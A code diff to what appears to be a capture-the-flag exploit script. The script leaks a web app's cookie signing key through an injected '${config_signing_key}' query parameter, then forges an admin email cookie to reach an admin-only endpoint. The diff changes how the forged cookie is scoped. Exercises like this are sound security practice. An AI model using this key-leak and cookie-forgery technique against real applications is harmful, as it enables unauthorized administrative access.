@@ -35,8 +35,10 @@ r = s.get(HOST + "/?foo=${config_signing_key}")
 cookie_signing_key = r.text[r.text.find("XXX") + 3 : r.text.rfind("XXX")]
 print("Cookie signing key: ", cookie_signing_key)
 # now we can become admin by signing their email as our email cookie
-s.cookies["email"] = sign_cookie("admin@wtf.sql")
+cookie_domain = s.cookies.list_domains()[0]
+s.cookies.set("email", sign_cookie("admin@wtf.sql"), domain=cookie_domain)
 # and let's hit the /list_users endpoint, which is admins only, to verify that
 # we did everything right so far
 r = s.get(HOST + "/list_users")
 assert r.status_code == 200, "Failed to sign admin cookie properly!"
+print("Cookies after becoming admin: ", s.cookies)
